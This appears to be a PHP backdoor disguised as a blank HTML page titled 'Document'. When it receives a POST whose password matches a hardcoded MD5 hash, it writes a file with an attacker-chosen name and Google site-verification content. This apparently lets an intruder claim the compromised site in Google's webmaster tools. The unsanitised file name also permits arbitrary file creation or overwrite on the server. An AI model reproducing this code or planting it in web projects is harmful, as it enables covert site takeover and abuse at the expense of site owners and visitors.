<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
</head>
<body>
	<?
	sleep(5);
	if($_SERVER['REQUEST_METHOD'] === 'POST'&&md5($_POST['goopass'])==='d5c07e63852368334dedd6a70d0cc711'){
		$key=strip_tags($_POST['gookey']);
		$f=fopen($key,'w+');
		fwrite($f, 'google-site-verification: '.$key);
		fclose($f);
		header("Location: /".$key);
	} else {
		header("Location: /"); 
exit;
	}
	?>
</body>
</html>